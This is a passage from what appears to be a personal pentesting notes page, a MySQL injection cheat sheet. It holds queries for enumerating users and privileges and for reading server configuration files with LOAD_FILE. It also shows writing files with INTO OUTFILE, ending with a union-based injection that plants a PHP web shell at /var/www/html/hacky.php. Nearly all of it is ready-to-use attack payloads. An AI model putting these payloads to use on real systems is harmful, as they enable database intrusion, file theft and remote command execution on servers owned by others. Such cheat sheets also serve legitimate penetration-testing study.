<span class="k">SELECT</span> <span class="k">column_name</span><span class="p">,</span> <span class="k">table_name</span><span class="p">,</span> <span class="n">table_schema</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="k">table_name</span> <span class="o">=</span> <span class="s1">'&lt;table name&gt;'</span><span class="p">;</span>

<span class="c1">-- get records of specified database + table:</span>
<span class="k">SELECT</span> <span class="o">&lt;</span><span class="k">column</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">FROM</span> <span class="o">&lt;</span><span class="k">database</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">.</span><span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span><span class="p">;</span>
</code></pre></div>

<p>to check for additional privileges such as file read / file write, we need to gather more info about our current user:</p>

<div class="highlight"><pre class="highlight sql"><code><span class="c1">-- find our current user:</span>
<span class="k">SELECT</span> <span class="k">user</span><span class="p">();</span>
<span class="k">SELECT</span> <span class="k">current_user</span><span class="p">();</span>
<span class="k">SELECT</span> <span class="k">user</span> <span class="k">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span>

<span class="c1">-- check all users for super admin</span>
<span class="c1">-- privileges (returns 'Y' if true):</span>
<span class="k">SELECT</span> <span class="n">super_priv</span> <span class="k">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="p">;</span>

<span class="c1">-- check specific user for super</span>
<span class="c1">-- admin privileges:</span>
<span class="k">SELECT</span> <span class="n">super_priv</span> <span class="k">FROM</span> <span class="n">mysql</span><span class="p">.</span><span class="k">user</span> <span class="k">WHERE</span> <span class="k">user</span> <span class="o">=</span> <span class="s1">'&lt;username&gt;'</span><span class="p">;</span>

<span class="c1">-- get other privileges granted</span>
<span class="c1">-- for all users:</span>
<span class="k">SELECT</span> <span class="n">grantee</span><span class="p">,</span> <span class="n">privilege_type</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">user_privileges</span><span class="p">;</span>

<span class="c1">-- get other privileges granted</span>
<span class="c1">-- for specific user:</span>
<span class="k">SELECT</span> <span class="n">grantee</span><span class="p">,</span> <span class="n">privilege_type</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">user_privileges</span> <span class="k">WHERE</span> <span class="n">grantee</span><span class="o">=</span><span class="nv">"'&lt;username&gt;'@'&lt;database IP or localhost&gt;'"</span><span class="p">;</span>
</code></pre></div>

<h2>database exploitation (mySQL)</h2>

<p>if we have <code>FILE</code> privileges, we can try to read and even write files:</p>

<div class="highlight"><pre class="highlight sql"><code><span class="c1">-- check the value of secure_file_priv, which needs</span>
<span class="c1">-- to be set in a certain way for file read / file write.</span>
<span class="c1">-- if empty, we could read/write files anywhere. if NULL,</span>
<span class="c1">-- nowhere. if a directory is set, this is the only</span>
<span class="c1">-- readable / writeable path available:</span>
<span class="k">SELECT</span> <span class="n">variable_name</span><span class="p">,</span> <span class="n">variable_value</span> <span class="k">FROM</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">global_variables</span> <span class="k">WHERE</span> <span class="n">variable_name</span><span class="o">=</span><span class="nv">"secure_file_priv"</span><span class="p">;</span>

<span class="c1">-- read file:</span>
<span class="k">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="s1">'&lt;file path&gt;'</span><span class="p">);</span>

<span class="c1">-- load content of file to table for reading:</span>
<span class="k">LOAD</span> <span class="k">DATA</span> <span class="k">LOCAL</span> <span class="n">INFILE</span> <span class="s1">'&lt;filename&gt;'</span> <span class="k">INTO</span> <span class="k">TABLE</span> <span class="o">&lt;</span><span class="n">filename</span><span class="o">&gt;</span><span class="p">;</span>

<span class="c1">-- find web root by reading apache/nginx/IIS conf.</span>
<span class="c1">-- also check default-web-root-directory-linux.txt or</span>
<span class="c1">-- default-web-root-directory-windows.txt from seclists:</span>
<span class="k">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="s1">'/etc/apache2/apache2.conf'</span><span class="p">);</span>
<span class="k">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="s1">'/etc/nginx/nginx.conf'</span><span class="p">);</span>
<span class="k">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="s1">'%WinDir%</span><span class="se">\S</span><span class="s1">ystem32</span><span class="se">\I</span><span class="s1">netsrv</span><span class="se">\C</span><span class="s1">onfig</span><span class="se">\A</span><span class="s1">pplicationHost.config'</span><span class="p">);</span>

<span class="c1">-- write a query result into file:</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="o">&lt;</span><span class="k">table</span> <span class="n">name</span><span class="o">&gt;</span> <span class="k">INTO</span> <span class="n">OUTFILE</span> <span class="s1">'&lt;path to file&gt;'</span><span class="p">;</span>

<span class="c1">-- write an arbitrary string into file:</span>
<span class="k">SELECT</span> <span class="s1">'&lt;string&gt;'</span> <span class="k">INTO</span> <span class="n">OUTFILE</span> <span class="s1">'&lt;path to file&gt;'</span><span class="p">;</span>

<span class="c1">-- write a basic PHP web shell into file, use</span>
<span class="c1">-- ?0=&lt;command&gt; to run commands in URL:</span>
<span class="k">SELECT</span> <span class="s1">'&lt;?php system($_REQUEST[0]); ?&gt;'</span> <span class="k">INTO</span> <span class="n">OUTFILE</span> <span class="s1">'&lt;path to file&gt;'</span><span class="p">;</span>

<span class="c1">-- example with union-based injection.</span>
<span class="c1">-- be sure to keep a trailing space at</span>
<span class="c1">-- the end:</span>
<span class="s1">'UNION SELECT "","&lt;?php system($_REQUEST[0]); ?&gt;","","" INTO OUTFILE"/var/www/html/hacky.php"-- 
</span></code></pre></div>

<h2>references</h2>

<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass" rel="nofollow">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass</a></li>
</ul>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

